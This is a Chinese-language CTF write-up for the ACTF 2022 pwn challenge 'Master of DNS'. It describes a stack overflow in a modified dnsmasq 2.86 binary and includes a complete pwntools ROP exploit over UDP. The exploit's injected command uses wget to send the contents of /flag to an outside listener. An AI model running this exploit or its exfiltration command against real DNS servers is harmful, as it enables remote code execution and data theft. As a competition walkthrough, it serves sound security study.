---
title: ACTF 2022 Pwn Master of DNS
categories:
- CTF/Pwn
tags: 
---

> 更新中...

![image](https://xuanxuanblingbling.github.io/assets/pic/dns/actf.png)

![image](https://xuanxuanblingbling.github.io/assets/pic/dns/dns.png)

附件：[dns.zip](https://xuanxuanblingbling.github.io/assets/attachment/actf/dns.zip)

## 确认软件

题目是个DNS服务器:

- PC中常见[BIND](https://www.isc.org/bind/)
- IoT中常见[Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html)

虽然题目把具体的dns软件名隐去了，但通过2.86的版本号还是能很明显的看出来，软件为[dnsmasq-2.86.tar.gz](https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz)：

```c
➜  ./dns --help
Usage: dns [options]

➜  ./dns -v    
Dns version 2.86
```

对于给出真实软件的CTF题目，漏洞可能是真实存在的1day或者0day，也有可能是出题人埋进去的一个漏洞。对于dnsmasq，能找到一些堆溢出引发的DoS，以及对较老的2.78版本（2017年）的RCE，但是没有找到新版本可RCE的漏洞或者披露文章，所以看起来埋洞的可能性更大。

- [Behind the Masq: Yet more DNS, and DHCP, vulnerabilities](https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html)
- [https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=dnsmasq](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=dnsmasq)
- [Dnsmasq < 2.78 - Heap Overflow](https://www.exploit-db.com/exploits/42942)

## 漏洞挖掘

首先进行基本检查，x86，无符号，没canary，可以猜测大概率是栈溢出：

```c
➜  file ./dns
./dns: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), stripped
➜  checksec ./dns
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

虽然给出的二进制无符号，但其也是一款开源软件，因此基本不需要逆向。对于本题，一款有源码的dns软件，我们有四种角度，或者说手段，来处理他、认识他：

- 源码
- 二进制
- gdb调试
- 流量调试

### 二进制比对

```
➜  strings ./dns | grep GCC
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
➜  gcc --version
gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
```

```
CFLAGS        = -m32 -fno-stack-protector -Wall -W 
LDFLAGS       = -m32 -no-pie 
```

```
➜  make
➜  file ./src/dnsmasq 
./src/dnsmasq: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), not stripped
```

![image](https://xuanxuanblingbling.github.io/assets/pic/dns/bindiff1.png)

![image](https://xuanxuanblingbling.github.io/assets/pic/dns/bindiff2.png)

![image](https://xuanxuanblingbling.github.io/assets/pic/dns/memcpy.png)

> dnsmasq-2.86/src/rfc1035.c

```c
int extract_name(struct dns_header *header, size_t plen, unsigned char **pp, 
		 char *name, int isExtract, int extrabytes)
```

### gdb调试

```
.text:0804F435                 push    [ebp+n]         ; n
.text:0804F438                 push    [ebp+src]       ; src
.text:0804F43B                 lea     eax, [ebp+dest]
.text:0804F441                 push    eax             ; dest
.text:0804F442                 mov     ebx, edx
.text:0804F444                 call    _memcpy
```

```
➜  ./dns -C ./dns.conf 
➜  ps -ef | grep dns
xuanxuan    6363    1914  0 08:06 ?        00:00:00 ./dns -C ./dns.conf
```

```
➜  gdb --pid 6363  
ptrace: Operation not permitted.
➜  sudo gdb --pid 6363
pwndbg> b * 0x804F444
Breakpoint 1 at 0x804f444
pwndbg> c

```

```
➜  dig @127.0.0.1 -p 9999 baidu.com
```

```
Breakpoint 1, 0x0804f444 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x804f444    call   memcpy@plt                     <memcpy@plt>
        dest: 0xffbfc2f7 ◂— 0x9bea000
        src: 0x9f075b0 ◂— 'baidu.com'
        n: 0xa
```


```
➜  dig @127.0.0.1 -p 9999 baidu.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

dig: 'baidu.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' 
is not a legal IDNA2008 name (domain label longer than 63 characters), use +noidnin
```

### 流量调试


```
➜  dig @127.0.0.1 -p 9999 baidu.com
```

![image](https://xuanxuanblingbling.github.io/assets/pic/dns/wireshark.jpeg)

```
0000   b0 6b 01 20 00 01 00 00 00 00 00 01 05 62 61 69
0010   64 75 03 63 6f 6d 00 00 01 00 01
```

可以用scapy，但是更喜欢彻底控制每一个字节


```python
from pwn import *

io = remote("127.0.0.1",9999,typ='udp')

head    = bytes.fromhex("000001200001000000000001")
payload = (b'\x3f'+b'a'*0x3f)*16 + b'\x00'
end     = bytes.fromhex("00010001")

io.send(head + payload + end)
```

```
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────── ───────[ REGISTERS ]───────────────────────────
*EBX  0x612e6161 ('aa.a')
*ECX  0xffb99b00 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
*EDX  0xffb997a7 ◂— 0x61616161 ('aaaa')
 EDI  0xf7f35000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0x940a9c0 ◂— 0x2910
*EBP  0x61616161 ('aaaa')
*ESP  0xffb99b30 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
*EIP  0x61616161 ('aaaa')
───────────────────────[ DISASM ]────────────────────────────
Invalid address 0x61616161
```


## 漏洞利用

```
rop：

1. 寻找fd
2. 修栈
3. execl popen

popen 字符串

查看控制流劫持时状态：

- 只在堆上栈上
- ecx ebx寄存器有用

找到popen gadget很可惜，差一点

想办法交换，然后找gadget，可以add eax，edx

但是不能把eax变0，想到加法

但是edx指向的栈空间之后会被使用，所以将cmd拼到rop后，最终完成

注意不能有空字节，不能有0x2e，所以想rop只能出在32位上了
```

```python
from pwn import *
context(log_level='debug')

io = remote("59.63.224.108",9999,typ='udp')

vps = b"127.0.0.1"
cmd = b'wget `echo -e "%s"`/`cat /flag`' % (vps.replace(b'.',b'\\x2e'))

# 0x08059d44 : pop eax ; ret
# 0x08094d60 : add eax, 0x11038 ; nop ; pop ebp ; ret
# 0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret
# 0x0807ec72 : pop edx ; ret

rop  = p32(0x08059d44)      # pop eax ; ret
rop += p32(0xfffef38d)      # 0xfffef38d + 0x11038 = 0x3c5, eax = edx + 0x3c5, eax will point to cmd 
rop += p32(0x08094d60)      # add eax, 0x11038 ; nop ; pop ebp ; ret
rop += p32(0x11223344)      # padding
rop += p32(0x0804b639)      # add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret
rop += p32(0x11223344) * 6  # padding
rop += p32(0x0807ec72)      # pop edx ; ret
rop += p32(0x0809C7B2)      # string r
rop += p32(0x08071802)      # push edx(r) ; push eax(cmd) ; call popen

assert(len(rop) < 63)
assert(len(cmd) < 59)

payload   = (b'\x3f'+b'a'*0x3f) * 14
payload  +=  b'\x04'+b'a'*4
payload  +=  b'\x3f'+rop.ljust(0x3f,b'a')
payload  +=  chr(len(cmd)).encode() + cmd
payload  +=  b'\x00'

head = bytes.fromhex("000001200001000000000001")
end  = bytes.fromhex("00010001")
io.send(head+payload+end)
```


```
ubuntu@VM-16-6-ubuntu:~$ sudo nc -l 80
GET /ACTF%7Bd0M@1n_Po1nt3rs_aR3_VuLn3rab1e_1d7a90a63039831c7fcaa53b766d5b2d!!!!!%7D HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
```


```
ACTF{d0M@1n_Po1nt3rs_aR3_VuLn3rab1e_1d7a90a63039831c7fcaa53b766d5b2d!!!!!}
```